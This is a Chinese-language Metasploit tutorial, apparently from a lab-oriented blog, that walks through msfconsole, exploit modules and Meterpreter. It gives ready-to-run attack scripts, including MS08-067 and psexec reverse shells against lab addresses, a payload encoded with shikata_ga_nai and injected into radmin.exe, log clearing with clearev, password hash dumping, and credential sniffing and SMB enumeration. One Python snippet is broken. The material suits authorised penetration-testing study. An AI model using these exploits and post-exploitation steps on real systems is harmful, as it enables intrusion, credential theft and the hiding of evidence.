<h4 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h4><ul>
<li>使用前先升级：<strong>msfupdate</strong></li>
<li>msfcli 使用接口，现在已经更新至 msfconsole -x</li>
<li>msfconsole 使用接口<ul>
<li>最流行的用户接口</li>
<li>几乎可以使用全部 msf 功能</li>
<li>控制台命令支持 TAB 自动补全</li>
<li>支持外部命令的执行（系统命令等）</li>
</ul>
</li>
<li>点击鼠标启动</li>
</ul>
<pre><code>通用选项:
    -E, --environment ENVIRONMENT    设置Rails环境，默认为RAIL_ENV环境变量或&#39;生产&#39;

数据库选项:
    -M, --migration-path DIRECTORY   指定包含其他数据库迁移的目录
    -n, --no-database                禁用数据库支持
    -y, --yaml PATH                  指定一个包含数据库设置的YAML文件

框架选项:
    -c FILE                          加载指定的配置文件
    -v, -V, --version                显示版本

模块选项:
        --defer-module-loads         除非明确询问，否则推迟模块加载
    -m, --module-path DIRECTORY      加载一个额外的模块路径

控制台选项:
    -a, --ask                        在退出Metasploit之前询问或接受&#39;退出-y&#39;
    -H, --history-file FILE          将命令历史记录保存到指定的文件
    -L, --real-readline              使用系统Readline库而不是RbReadline
    -o, --output FILE                输出到指定的文件
    -p, --plugin PLUGIN              在启动时加载插件
    -q, --quiet                      不要在启动时显示 banner 信息
    -r, --resource FILE              执行指定的资源文件（ - 用于stdin）
    -x, --execute-command COMMAND    执行指定的控制台命令（使用;用于倍数）
    -h, --help                       显示此消息</code></pre><ul>
<li>进入 msfconsole，查看帮助信息</li>
</ul>
<pre><code>root@kali:~# msfconsole
msf &gt; help

核心命令
=============

    命令            描述
    -------       -----------
    ?             帮助菜单
    banner        显示一个很棒的metasploit横幅
    cd            更改当前的工作目录
    color         切换高亮显示颜色
    connect       连接与主机通信
    exit          退出退出控制台
    get           获取特定于上下文的变量的值
    getg          获取全局变量的值
    grep          Grep另一个命令的输出
    help          帮助菜单
    history       历史显示命令历史
    irb           进入irb脚本模式
    load          加载一个框架插件
    quit          退出控制台
    route         路由通过会话路由流量
    save          保存保存活动的数据存储
    sessions      会话转储会话列表并显示有关会话的信息
    set           将特定于上下文的变量设置为一个值
    setg          将全局变量设置为一个值
    sleep         睡眠在指定的秒数内不执行任何操作
    spool         将控制台输出写入文件以及屏幕
    threads       线程查看和操作后台线程
    unload        卸载卸载框架插件
    unset         取消设置取消设置一个或多个特定于上下文的变量
    unsetg        取消设置取消设置一个或多个全局变量
    version       版本显示框架和控制台库版本号


模块命令
===============

    命令            描述
    -------       -----------
    advanced      高级显示一个或多个模块的高级选项
    back          返回从当前上下文返回
    edit          编辑使用首选编辑器编辑当前模块或文件
    info          显示有关一个或多个模块的信息
    loadpath      加载路径搜索并加载路径中的模块
    options       选项显示全局选项或一个或多个模块
    popm          将最新的模块从堆栈弹出并使其处于活动状态
    previous      将之前加载的模块设置为当前模块
    pushm         将活动或模块列表推入模块堆栈
    reload_all    重新加载所有定义的模块路径中的所有模块
    reload_lib    从指定路径加载库文件
    search        搜索搜索模块名称和说明
    show          显示给定类型的模块或所有模块
    use           使用按名称选择模块


工作命令
============

    命令            描述
    -------       -----------
    handler       处理程序作为作业启动负载处理程序
    jobs          作业显示和管理作业
    kill          杀死一份工作
    rename_job    重命名作业


资源脚本命令
========================

    命令            描述
    -------       -----------
    makerc        保存从开始到文件输入的命令
    resource      运行存储在文件中的命令


数据库后端命令
=========================

    命令                描述
    -------           -----------
    db_connect        连接到现有的数据库
    db_disconnect     断开当前数据库实例
    db_export         导出包含数据库内容的文件
    db_import         导入扫描结果文件（文件类型将被自动检测）
    db_nmap           执行nmap并自动记录输出
    db_rebuild_cache  重建数据库存储的模块缓存
    db_status         显示当前的数据库状态
    hosts             列出数据库中的所有主机
    loot              列出数据库中的所有战利品
    notes             列出数据库中的所有注释
    services          列出数据库中的所有服务
    vulns             列出数据库中的所有漏洞
    workspace         在数据库工作区之间切换


凭证后端命令
============================

    命令            描述
    -------       -----------
    creds         列出数据库中的所有凭据(密码)</code></pre><ul>
<li>msf &gt; help show</li>
</ul>
<pre><code>[*]“show” 命令的有效参数是：all, encoders, nops, exploits, payloads, auxiliary, plugins, info, options
[*]其他特定于模块的参数是：missing, advanced, evasion, targets, actions</code></pre><ul>
<li>msf &gt; help search</li>
</ul>
<pre><code>用法: search [keywords]

Keywords:
  app       :  客户端或服务器攻击的模块
  author    :  本作者编写的模块
  bid       :  具有匹配的Bugtraq ID的模块
  cve       :  具有匹配CVE ID的模块
  edb       :  具有匹配的Exploit-DB ID的模块
  name      :  具有匹配描述性名称的模块
  platform  :  影响这个平台的模块
  ref       :  具有匹配参考的模块
  type      :  特定类型的模块（exploit，auxiliary或post）

msf &gt; search ms08-067
msf &gt; search name:mysql / type:aux /author:aaron    # 可多条件同时搜索</code></pre><ul>
<li>模块内命令</li>
</ul>
<pre><code>msf &gt; search ms09_001_write
msf &gt; use auxiliary/dos/windows/smb/ms09_001_write
msf auxiliary(dos/windows/smb/ms09_001_write) &gt; info

[*]其他特定于模块的参数是：missing, advanced, evasion, targets, actions
msf auxiliary(dos/windows/smb/ms09_001_write) &gt; show missing
msf auxiliary(dos/windows/smb/ms09_001_write) &gt; show advanced
msf auxiliary(dos/windows/smb/ms09_001_write) &gt; show targets



msf auxiliary(dos/windows/smb/ms09_001_write) &gt; help edit
    用法：编辑[file / to / edit.rb]
    使用编辑当前活动模块或本地文件。
    如果指定了文件路径，它将在编辑后自动重新加载。
    否则，您可以使用“重新加载”或“重新运行”来重新加载活动模块。
msf auxiliary(dos/windows/smb/ms09_001_write) &gt; edit</code></pre><ul>
<li>数据库操作</li>
</ul>
<pre><code>msf &gt; help db_connect 
    [*]    Usage: db_connect &lt;user:pass&gt;@&lt;host:port&gt;/&lt;database&gt;
    [*]       OR: db_connect -y [path/to/database.yml]
    [*] Examples:
    [*]        db_connect user@metasploit3
    [*]        db_connect user:pass@192.168.0.2/metasploit3
    [*]        db_connect user:pass@192.168.0.2:1500/metasploit3

msf &gt; help db_import
    Usage: db_import &lt;filename&gt; [file2...]
    Filenames can be globs like *.xml, or **/*.xml which will search recursively

msf &gt; help db_export
    Usage:
    db_export -f &lt;format&gt; [filename]
    Format can be one of: xml, pwdump</code></pre><ul>
<li>msf &gt; help sessions<br>Usage: sessions [options] or sessions [id]</li>
</ul>
<pre><code>活动的会话操作和交互。

选项:

    -C &lt;opt&gt;  在-i或全部给定的会话上运行Meterpreter命令
    -K        终止所有会话
    -S &lt;opt&gt;  行搜索过滤器。
    -c &lt;opt&gt;  在-i或全部给定的会话上运行命令
    -h        帮助横幅
    -i &lt;opt&gt;  与提供的会话ID进行交互
    -k &lt;opt&gt;  按会话ID和/或范围终止会话
    -l        列出所有活动会话
    -n &lt;opt&gt;  按ID命名或重命名会话
    -q        静音模式
    -r        重置用-i或全部给定的会话的环形缓冲区
    -s &lt;opt&gt;  在-i或全部给定的会话上运行脚本或模块
    -t &lt;opt&gt;  设置响应超时（默认值：15）
    -u &lt;opt&gt;  在许多平台上将shell升级到meterpreter会话
    -v        以详细模式列出会话
    -x        在会话表中显示扩展信息

许多选项允许使用逗号和破折号指定会话范围。
例如:  sessions -s checkvm -i 1,3-5  or  sessions -k 1-2,5,6</code></pre><h4 id="5-Exploit-模块"><a href="#5-Exploit-模块" class="headerlink" title="5. Exploit 模块"></a>5. Exploit 模块</h4><h5 id="1-Active-exploit"><a href="#1-Active-exploit" class="headerlink" title="1.Active exploit"></a>1.Active exploit</h5><p>攻击者主动连接受害者：</p>
<pre><code>root@kali:~# cat ms08067.rb 
use exploit/windows/smb/ms08_067_netapi
set RHOST 10.10.10.147
set RPORT 445
set PAYLOAD windows/shell/reverse_tcp
set LHOST 10.10.10.131
set LPORT 4444
exploit</code></pre><p><img src="https://i.imgur.com/rNO4Mud.png" alt="img"></p>
<pre><code>root@kali:~# cat psexec.rb 
use exploit/windows/smb/psexec
set RHOST 10.10.10.148
set PAYLOAD windows/shell/reverse_tcp
set LHOST 10.10.10.131
set LPORT 4444
set SMBUSER Administrator
set SMBPASS 123456
exploit</code></pre><p><img src="https://i.imgur.com/ctvHDYR.png" alt="img"></p>
<h5 id="2-Passive-Exploits"><a href="#2-Passive-Exploits" class="headerlink" title="2. Passive Exploits"></a>2. Passive Exploits</h5><p>攻击者等待受害者来触发连接，反弹到攻击者</p>
<pre><code>root@kali:~# cat ms07017.rb 
use exploit/windows/browser/ms07_017_ani_loadimage_chunksize
set URIPATH /
set SRVHOST 0.0.0.0
set PAYLOAD windows/shell/reverse_tcp
set EXITFUNC thread
set LHOST 10.10.10.131
set LPORT 4444
exploit</code></pre><p><img src="https://i.imgur.com/meKMAdB.png" alt="img"></p>
<p><img src="https://i.imgur.com/aEu1anZ.png" alt="img"></p>
<h4 id="6-生成payload"><a href="#6-生成payload" class="headerlink" title="6.生成payload"></a>6.生成payload</h4><ul>
<li>用法</li>
</ul>
<pre><code>msf &gt; search ms08-067
msf &gt; use payload/windows/shell/bind_tcp
msf payload(windows/shell/bind_tcp) &gt; generate  #获得shellcode
msf payload(windows/shell/bind_tcp) &gt; generate -h
    Usage: generate [options]
    Generates a payload.
    OPTIONS:
        -E        强制编码。
        -b &lt;opt&gt;  要避免的字符列表：&#39;\ x00 \ xff&#39;
        -e &lt;opt&gt;  要使用的编码器模块的名称。
        -f &lt;opt&gt;  输出文件名（否则为stdout）
        -h        帮助横幅。
        -i &lt;opt&gt;  编码迭代的次数。
        -k        保持模板可执行的功能
        -o &lt;opt&gt;  以VAR = VAL格式逗号分隔的选项列表。
        -p &lt;opt&gt;  输出平台
        -s &lt;opt&gt;  NOP sled length.
        -t &lt;opt&gt;  输出格式: bash,c,csharp,dw,dword,hex,java,js_be,js_le,num,perl,pl,powershell,ps1,py,python,raw,rb,ruby,sh,vbapplication,vbscript,asp,aspx,aspx-exe,axis2,dll,elf,elf-so,exe,exe-only,exe-service,exe-small,hta-psh,jar,jsp,loop-vbs,macho,msi,msi-nouac,osx-app,psh,psh-cmd,psh-net,psh-reflection,vba,vba-exe,vba-psh,vbs,war
        -x &lt;opt&gt;  要使用的可执行模板

msf payload(windows/shell/bind_tcp) &gt; generate</code></pre><p><img src="https://i.imgur.com/wEztOAj.png" alt="img"></p>
<ul>
<li>自动绕过坏字符</li>
</ul>
<pre><code>msf payload(windows/shell/bind_tcp) &gt; generate -b &#39;\x00&#39;
msf payload(windows/shell/bind_tcp) &gt; generate -b &#39;\x00\x44\x67\x66\xfa\x01\xe0\x44\x67\xa1\xa2\xa3\x75\x4b&#39;</code></pre><ul>
<li>手动指定编码模块</li>
</ul>
<pre><code>msf payload(windows/shell/bind_tcp) &gt; show encoders</code></pre><p><img src="https://i.imgur.com/siajCwd.png" alt="img"></p>
<ul>
<li>注入文件</li>
</ul>
<pre><code>msf payload(windows/shell/bind_tcp) &gt; generate -b &#39;\x00&#39; -t exe -e x86/shikata_ga_nai -i 5 -k -x /usr/share/windows-binaries/radmin.exe -f /root/1.exe</code></pre><ul>
<li><p>NOP：no-operation / Next Operation （无任何操作）</p>
<ul>
<li>EIP 返回存储 NOP sled 的任意地址时将递增，最终导致 shellcode 执行</li>
<li>增加一行 EOP</li>
</ul>
<pre><code>msf payload(windows/shell/bind_tcp) &gt; generate -s 14</code></pre></li>
</ul>
<h4 id="7-metepreter"><a href="#7-metepreter" class="headerlink" title="7. metepreter"></a>7. metepreter</h4><h5 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h5><ul>
<li>高级、动态、可扩展的 payload<ul>
<li>基于 metepreter 上下文利用更多漏洞发起攻击</li>
<li>后渗透测试阶段一站式操作界面</li>
</ul>
</li>
<li>完全基于内存的 DLL 注入式 payload （不写硬盘）<ul>
<li>注入合法系统进程并建立 stager</li>
<li>基于 stager 上传和预加载 dll 进行扩展模块 TLS/1.0 通信隧道</li>
<li>利用 TLS 隧道进一步加载后续扩展模块（避免网络取证）</li>
</ul>
</li>
<li>服务端使用 c 语言编写</li>
<li>客户端提供基于 ruby 的全特性 API（支持任何语言）</li>
</ul>
<h5 id="2-使用"><a href="#2-使用" class="headerlink" title="2.使用"></a>2.使用</h5><pre><code>root@kali:~# cat metepreter.rb 
use exploit/windows/smb/ms08_067_netapi
set payload windows/meterpreter/reverse_tcp
set RHOST 10.10.10.147
set LHOST 10.10.10.131
run</code></pre><p><img src="https://i.imgur.com/b9G8Uq6.png" alt="img"></p>
<ul>
<li>帮助文件</li>
</ul>
<pre><code>meterpreter &gt; help

核心命令
=============

    命令                     描述
    -------                   -----------
    ?                         帮助菜单
    background                背景当前会话
    bgkill                    杀死一个背景meterpreter脚本
    bglist                    列出运行后台脚本
    bgrun                     执行一个meterpreter脚本作为后台线程
    channel                   显示信息或控制活动频道
    close                     关闭频道
    disable_unicode_encoding  禁用unicode字符串的编码
    enable_unicode_encoding   启用unicode字符串的编码
    exit                      终止meterpreter会话
    get_timeouts              获取当前会话超时值
    guid                      获取会话GUID
    help                      帮助菜单
    info                      显示有关Post模块的信息
    irb                       进入irb脚本模式
    load                      加载一个或多个meterpreter扩展
    machine_id                获取连接到会话的计算机的MSF ID
    migrate                   将服务器迁移到另一个进程
    pivot                     管理数据透视监听器
    quit                      终止meterpreter会话
    read                      从频道读取数据
    resource                  运行存储在文件中的命令
    run                       执行meterpreter脚本或Post模块
    sessions                  快速切换到另一个会话
    set_timeouts              设置当前会话超时值
    sleep                     Force Meterpreter安静，然后重新建立会话。
    transport                 更改当前的传输机制
    use                       不推荐使用“加载”别名
    uuid                      获取当前会话的UUID
    write                     将数据写入通道


Stdapi: 文件系统命令
============================

    命令          描述
    -------       -----------
    cat           将文件的内容读取到屏幕上
    cd            更改目录
    checksum      检索文件的校验和
    cp            将源复制到目标
    dir           列表文件（ls的别名）
    download      下载文件或目录
    edit          编辑一个文件
    getlwd        打印本地工作目录
    getwd         打印工作目录
    lcd           更改本地工作目录
    lls           列出本地文件
    lpwd          打印本地工作目录
    ls            列出文件
    mkdir         建立目录
    mv            将源移到目标
    pwd           打印工作目录
    rm            删除指定的文件
    rmdir         删除目录
    search        搜索文件
    show_mount    列出所有安装点/逻辑驱动器
    upload        上传文件或目录


Stdapi: 网络命令
===========================

    命令          描述
    -------       -----------
    arp           显示主机ARP缓存
    getproxy      显示当前的代理配置
    ifconfig      显示界面
    ipconfig      显示界面
    netstat       显示网络连接
    portfwd       将本地端口转发到远程服务
    resolve       解析目标上的一组主机名
    route         查看和修改路由表


Stdapi: 系统命令
=======================

    Command       Description
    -------       -----------
    clearev       清除事件日志
    drop_token    放弃任何活动的模拟令牌。
    execute       执行一个命令
    getenv        获取一个或多个环境变量值
    getpid        获取当前的进程标识符
    getprivs      尝试启用当前进程可用的所有权限
    getsid        获取运行服务器的用户的SID
    getuid        获取服务器正在运行的用户
    kill          终止一个过程
    localtime     显示目标系统的本地日期和时间
    pgrep         按名称过滤进程
    pkill         按名称终止进程
    ps            列出运行的进程
    reboot        重新启动远程计算机
    reg           修改远程注册表并与之交互
    rev2self      在远程机器上调用RevertToSelf（）
    shell         放入系统命令外壳
    shutdown      关闭远程计算机
    steal_token   尝试从目标进程中盗取模拟令牌
    suspend       暂停或恢复进程列表
    sysinfo       获取有关远程系统的信息，例如OS


Stdapi: 用户界面命令
===============================

    命令          描述
    -------        -----------
    enumdesktops   列出所有可访问的桌面和窗口工作站
    getdesktop     获取当前meterpreter桌面
    idletime       返回远程用户闲置的秒数
    keyscan_dump   转储按键缓冲区
    keyscan_start  开始捕捉击键
    keyscan_stop   停止捕获击键
    screenshot     获取交互式桌面的屏幕截图
    setdesktop     更改meterpreters当前桌面
    uictl          控制一些用户界面组件


Stdapi: Webcam 命令
=======================

    命令          描述
    -------        -----------
    record_mic     从默认麦克风录制音频X秒
    webcam_chat    开始视频聊天
    webcam_list    列出网络摄像头
    webcam_snap    从指定的摄像头拍摄快照
    webcam_stream  从指定的摄像头播放视频流


Priv: Elevate Commands
======================

    命令          描述
    -------       -----------
    getsystem     尝试将您的特权提升为本地系统的特权。


Priv: 密码数据库命令
================================

    命令          描述
    -------       -----------
    hashdump      转储SAM数据库的内容


Priv: Timestomp 命令
========================

    命令          描述
    -------       -----------
    timestomp     操纵文件MACE属性</code></pre><ul>
<li>使用</li>
</ul>
<pre><code>meterpreter &gt; execute -f cmd.exe
meterpreter &gt; ps
meterpreter &gt; getuid
meterpreter &gt; getpid
meterpreter &gt; clearev   # 清除日志
meterpreter &gt; upload /usr/share/windows-binaries/nc.exe c:\\windows\\system32       # 上传文件

meterpreter &gt; upload /usr/share/windows-binaries/nc.exe c:\\windows\\system32
msf exploit(windows/smb/ms08_067_netapi) &gt; sessions -l
msf exploit(windows/smb/ms08_067_netapi) &gt; sessions -i 1

meterpreter &gt; hashdump  # 读取密码
meterpreter &gt; run post/windows/gather/hashdump  # 读取密码

meterpreter &gt; shell</code></pre><p><img src="https://i.imgur.com/lJasRoT.png" alt="img"></p>
<h4 id="Meterpreter-python-扩展"><a href="#Meterpreter-python-扩展" class="headerlink" title="Meterpreter python 扩展"></a>Meterpreter python 扩展</h4><ul>
<li>2015 年11月份，来自社区贡献</li>
<li>无需运行环境，在客户端运行原生 python 代码</li>
<li>使用</li>
</ul>
<pre><code>meterpreter &gt; load python
meterpreter &gt; python_execute &quot;print (&#39;asdasdas&#39;)&quot;
meterpreter &gt; python_execute &quot;import os; cd = os.getcwd()&quot; -r cd



root@kali:~# cat find2.py 
import os
for root,dirs,files in os.walk(c://*):
    for file in files:
        if file.endwith(&quot;.ini&quot; ) and file.startwith(&quot;win&quot;):
            print(os.path.john(root,file))
python_import -f find.py</code></pre><h4 id="9-msfcli"><a href="#9-msfcli" class="headerlink" title="9. msfcli"></a>9. msfcli</h4><ul>
<li>2015 年6月已经被取消</li>
<li>由 msfconsole -x 取代</li>
<li>编写脚本时便于引用</li>
</ul>
<pre><code>msfconsole -x &quot;use exploit/windows/smb/ms08_067_netapi; set RHOST 10.10.10.147; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 10.10.10.131; set LPORT 5555; set target 34; exploit&quot;</code></pre><h3 id="Mestasploit-信息收集"><a href="#Mestasploit-信息收集" class="headerlink" title="Mestasploit 信息收集"></a>Mestasploit 信息收集</h3><h5 id="模块位置："><a href="#模块位置：" class="headerlink" title="模块位置："></a><strong>模块位置：</strong></h5><ul>
<li>信息收集的模块都在 auxiliary/scanner/ 之下</li>
</ul>
<pre><code>msf &gt; use auxiliary/scanner/ [TAB]
Display all 531 possibilities? (y or n)</code></pre><h4 id="1-db-nmap"><a href="#1-db-nmap" class="headerlink" title="1. db_nmap"></a>1. db_nmap</h4><ul>
<li>跟 nmap 用法一样，结果存放在 msf 的数据库中</li>
</ul>
<pre><code>msf &gt; db_nmap -sV 10.10.10.0/24</code></pre><ul>
<li>auxiliary 目录下</li>
<li>RHOSTS &lt;&gt; RHOST<ul>
<li>192.168.1.20-192.168.1.30、192.168.1.0/24,192.168.11.0/24</li>
<li>也可以编写地址列表：file:/root/h.txt</li>
</ul>
</li>
</ul>
<h4 id="2-主机发现扫描"><a href="#2-主机发现扫描" class="headerlink" title="2.主机发现扫描"></a>2.主机发现扫描</h4><ul>
<li>use auxiliary/scanner/discovery/arp_sweep</li>
<li>set INTERFACE、RHOSTS、SHOST、SMAC、THREADS；run</li>
</ul>
<pre><code>msf &gt; search arp
msf &gt; use auxiliary/scanner/discovery/arp_sweep
msf auxiliary(scanner/discovery/arp_sweep) &gt; show options 
msf auxiliary(scanner/discovery/arp_sweep) &gt; set RHOSTS 10.10.10.0/24
msf auxiliary(scanner/discovery/arp_sweep) &gt; set INTERFACE eth0
msf auxiliary(scanner/discovery/arp_sweep) &gt; set THREADS 20
msf auxiliary(scanner/discovery/arp_sweep) &gt; run</code></pre><h4 id="3-端口扫描"><a href="#3-端口扫描" class="headerlink" title="3.端口扫描"></a>3.端口扫描</h4><ul>
<li>use auxiliary/scanner/portscan/syn</li>
<li>set INTERFACE、PORTS、RHOSTS、THREADS；run</li>
</ul>
<pre><code>msf &gt; search portscan
msf &gt; use auxiliary/scanner/portscan/syn
msf auxiliary(scanner/portscan/syn) &gt; show options 
msf auxiliary(scanner/portscan/syn) &gt; set INTERFACE eth0
msf auxiliary(scanner/portscan/syn) &gt; set PORTS 80
msf auxiliary(scanner/portscan/syn) &gt; set RHOSTS 10.10.10.0/24
msf auxiliary(scanner/portscan/syn) &gt; set THREADS 50
msf auxiliary(scanner/portscan/syn) &gt; run</code></pre><h4 id="4-僵尸扫描"><a href="#4-僵尸扫描" class="headerlink" title="4.僵尸扫描"></a>4.僵尸扫描</h4><ul>
<li>查找 ipidseq 主机（查找僵尸机）<ul>
<li>use auxiliary/scanner/ip/ipidseq</li>
<li>set RHOSTS 192.168.1.0/24 ；run</li>
<li>nmap -PN -sI 10.10.10.147 10.10.10.132</li>
</ul>
</li>
</ul>
<pre><code>msf &gt; use auxiliary/scanner/ip/ipidseq
msf auxiliary(scanner/ip/ipidseq) &gt; show options 
msf auxiliary(scanner/ip/ipidseq) &gt; set RHOSTS 10.10.10.100-150
msf auxiliary(scanner/ip/ipidseq) &gt; set THREADS 20
msf auxiliary(scanner/ip/ipidseq) &gt; run</code></pre><pre><code>msf &gt; db_nmap -PN -sI 10.10.10.147 10.10.10.132</code></pre><h4 id="5-UDP扫描"><a href="#5-UDP扫描" class="headerlink" title="5.UDP扫描"></a>5.UDP扫描</h4><ul>
<li>use auxiliary/scanner/discovery/udp_sweep</li>
<li>use auxiliary/scanner/discovery/udp_probe</li>
</ul>
<pre><code>msf &gt; use auxiliary/scanner/discovery/udp_sweep
msf auxiliary(scanner/discovery/udp_sweep) &gt; show options 
msf auxiliary(scanner/discovery/udp_sweep) &gt; set RHOSTS 10.10.10.100-150
msf auxiliary(scanner/discovery/udp_sweep) &gt; run</code></pre><pre><code>msf &gt; use auxiliary/scanner/discovery/udp_probe
msf auxiliary(scanner/discovery/udp_probe) &gt; show options 
msf auxiliary(scanner/discovery/udp_probe) &gt; set RHOSTS 10.10.10.100-150
msf auxiliary(scanner/discovery/udp_probe) &gt; set CHOST 10.10.10.131
msf auxiliary(scanner/discovery/udp_probe) &gt; set THREADS 20
msf auxiliary(scanner/discovery/udp_probe) &gt; run</code></pre><h4 id="6-密码嗅探"><a href="#6-密码嗅探" class="headerlink" title="6.密码嗅探"></a>6.密码嗅探</h4><ul>
<li>use auxiliary/sniffer/psnuffle</li>
<li>支持从 pacap 抓包文件中提取密码</li>
<li>功能类似于 dsniff</li>
<li>目前只支持 pop3、imap、ftp、HTTP GET 协议</li>
</ul>
<pre><code>msf &gt; search sniffer
msf &gt; use auxiliary/sniffer/psnuffle
msf auxiliary(sniffer/psnuffle) &gt; show options 
msf auxiliary(sniffer/psnuffle) &gt; set INTERFACE eth0
msf auxiliary(sniffer/psnuffle) &gt; run</code></pre><pre><code>root@kali:~# ftp 10.10.10.148</code></pre><pre><code># 继续上述
msf auxiliary(sniffer/psnuffle) &gt; show options
msf auxiliary(sniffer/psnuffle) &gt; set PCAPFILE /root/ftp.pcapng
msf auxiliary(sniffer/psnuffle) &gt; jobs
msf auxiliary(sniffer/psnuffle) &gt; kill 0
msf auxiliary(sniffer/psnuffle) &gt; run</code></pre><h4 id="7-SNMP扫描"><a href="#7-SNMP扫描" class="headerlink" title="7.SNMP扫描"></a>7.SNMP扫描</h4><ul>
<li>vim /etc/snmp/snmpd.conf （侦听复制修改为 0.0.0.0：161）</li>
<li>use auxiliary/scanner/snmp/snmp_login</li>
<li>use auxiliary/scanner/snmp/snmp_enum</li>
<li>use auxiliary/scanner/snmp/snmp_enumusers （windows）</li>
<li>use auxiliary/scanner/snmp/snmp_enumshares （windows）</li>
</ul>
<pre><code>msf &gt; use auxiliary/scanner/snmp/snmp_login
msf auxiliary(scanner/snmp/snmp_login) &gt; show options 
msf auxiliary(scanner/snmp/snmp_login) &gt; set RHOSTS 10.10.10.149
msf auxiliary(scanner/snmp/snmp_login) &gt; set THREADS 20
msf auxiliary(scanner/snmp/snmp_login) &gt; run</code></pre><pre><code>msf &gt; use auxiliary/scanner/snmp/snmp_enum
msf auxiliary(scanner/snmp/snmp_enum) &gt; show options 
msf auxiliary(scanner/snmp/snmp_enum) &gt; set RHOSTS 10.10.10.149
msf auxiliary(scanner/snmp/snmp_enum) &gt; run
</code></pre><pre><code>msf &gt; use auxiliary/scanner/snmp/snmp_enum
msf auxiliary(scanner/snmp/snmp_enum) &gt; show options 
msf auxiliary(scanner/snmp/snmp_enum) &gt; set RHOSTS 10.10.10.142 （windows）
msf auxiliary(scanner/snmp/snmp_enum) &gt; run
msf auxiliary(scanner/snmp/snmp_enum) &gt; set COMMUNITY jlcssadmin （SNMP 服务器团体名）
msf auxiliary(scanner/snmp/snmp_enum) &gt; set THREADS 20
msf auxiliary(scanner/snmp/snmp_enum) &gt; run</code></pre><pre><code>msf &gt; use auxiliary/scanner/snmp/snmp_enumusers
msf auxiliary(scanner/snmp/snmp_enumusers) &gt; show options 
msf auxiliary(scanner/snmp/snmp_enumusers) &gt; set COMMUNITY jlcssadmin
msf auxiliary(scanner/snmp/snmp_enumusers) &gt; set RHOSTS 10.10.10.142
msf auxiliary(scanner/snmp/snmp_enumusers) &gt; run</code></pre><pre><code>msf &gt; use auxiliary/scanner/snmp/snmp_enumshares
msf auxiliary(scanner/snmp/snmp_enumshares) &gt; show options 
msf auxiliary(scanner/snmp/snmp_enumshares) &gt; set COMMUNITY jlcssadmin
msf auxiliary(scanner/snmp/snmp_enumshares) &gt; set RHOSTS 10.10.10.142
msf auxiliary(scanner/snmp/snmp_enumshares) &gt; run</code></pre><h4 id="8-SMB扫描"><a href="#8-SMB扫描" class="headerlink" title="8.SMB扫描"></a>8.SMB扫描</h4><ul>
<li>SMB 版本扫描<ul>
<li>use auxiliary/scanner/smb/smb_version</li>
</ul>
</li>
<li>扫描命令管道。判断 SMB 服务类型（账号、密码）<ul>
<li>use auxiliary/scanner/smb/pipe_auditor</li>
</ul>
</li>
<li>扫描通过 SMB 管道可以访问的 RCERPC 服务<ul>
<li>use auxiliary/scanner/smb/pipe_dcerpc_auditor</li>
</ul>
</li>
<li>SMB 共享账号（账号、密码）<ul>
<li>use auxiliary/scanner/smb/smb_enumshares</li>
</ul>
</li>
<li>SMB 用户枚举（账号、密码）<ul>
<li>use auxiliary/scanner/smb/smb_enumusers</li>
</ul>
</li>
<li>SID 枚举（账号、密码）<ul>
<li>use auxiliary/scanner/smb/smb_lookupsid</li>
</ul>
</li>
<li>SMB 版本扫描</li>
</ul>
<pre><code>msf &gt; search smb
msf &gt; use auxiliary/scanner/smb/smb_version
msf auxiliary(scanner/smb/smb_version) &gt; show options 
msf auxiliary(scanner/smb/smb_version) &gt; set RHOSTS 10.10.10.147, 10.10.10.148, 10.10.10.142
msf auxiliary(scanner/smb/smb_version) &gt; run</code></pre><pre><code># 继续上述
msf auxiliary(scanner/smb/smb_version) &gt; set SMBUSER Administrator
msf auxiliary(scanner/smb/smb_version) &gt; set SMBPass 123456
msf auxiliary(scanner/smb/smb_version) &gt; run</code></pre><ul>
<li>扫描命令管道。判断 SMB 服务类型（账号、密码）</li>
</ul>
<pre><code>msf &gt; use auxiliary/scanner/smb/pipe_auditor
msf auxiliary(scanner/smb/pipe_auditor) &gt; show options 
msf auxiliary(scanner/smb/pipe_auditor) &gt; set RHOSTS 10.10.10.148
msf auxiliary(scanner/smb/pipe_auditor) &gt; run</code></pre><pre><code># 继续上述
msf auxiliary(scanner/smb/pipe_auditor) &gt; set SMBUser Administrator
msf auxiliary(scanner/smb/pipe_auditor) &gt; set SMBPass 123456</code></pre><ul>
<li>扫描通过 SMB 管道可以访问的 RCERPC 服务</li>
</ul>
<pre><code>msf &gt; use auxiliary/scanner/smb/pipe_dcerpc_auditor
msf auxiliary(scanner/smb/pipe_dcerpc_auditor) &gt; show options 
msf auxiliary(scanner/smb/pipe_dcerpc_auditor) &gt; set RHOSTS 10.10.10.148
msf auxiliary(scanner/smb/pipe_dcerpc_auditor) &gt; run</code></pre><pre><code># 继续上述
msf auxiliary(scanner/smb/pipe_dcerpc_auditor) &gt; set SMBUser Administrator
msf auxiliary(scanner/smb/pipe_dcerpc_auditor) &gt; set SMBPass 123456
msf auxiliary(scanner/smb/pipe_dcerpc_auditor) &gt; run</code></pre><ul>
<li>SMB 共享账号（账号、密码）</li>
</ul>
<pre><code>msf &gt; use auxiliary/scanner/smb/smb_enumshares
msf auxiliary(scanner/smb/smb_enumshares) &gt; show options 
msf auxiliary(scanner/smb/smb_enumshares) &gt; set RHOSTS 10.10.10.148
msf auxiliary(scanner/smb/smb_enumshares) &gt; run</code></pre><pre><code># 继续上述
msf auxiliary(scanner/smb/smb_enumshares) &gt; set SMBUser Administrator
msf auxiliary(scanner/smb/smb_enumshares) &gt; set SMBPass 123456
msf auxiliary(scanner/smb/smb_enumshares) &gt; run</code></pre><ul>
<li>SMB 用户枚举（账号、密码）</li>
</ul>
<pre><code>msf &gt; use auxiliary/scanner/smb/smb_enumusers
msf auxiliary(scanner/smb/smb_enumusers) &gt; show options 
msf auxiliary(scanner/smb/smb_enumusers) &gt; set RHOSTS 10.10.10.148
msf auxiliary(scanner/smb/smb_enumusers) &gt; run</code></pre><pre><code># 继续上述
msf auxiliary(scanner/smb/smb_enumusers) &gt; set SMBUser Administrator
msf auxiliary(scanner/smb/smb_enumusers) &gt; set SMBPass 123456
msf auxiliary(scanner/smb/smb_enumusers) &gt; run</code></pre><ul>
<li>SID 枚举（账号、密码）</li>
</ul>
<pre><code>msf &gt; use auxiliary/scanner/smb/smb_lookupsid
msf auxiliary(scanner/smb/smb_lookupsid) &gt; show options 
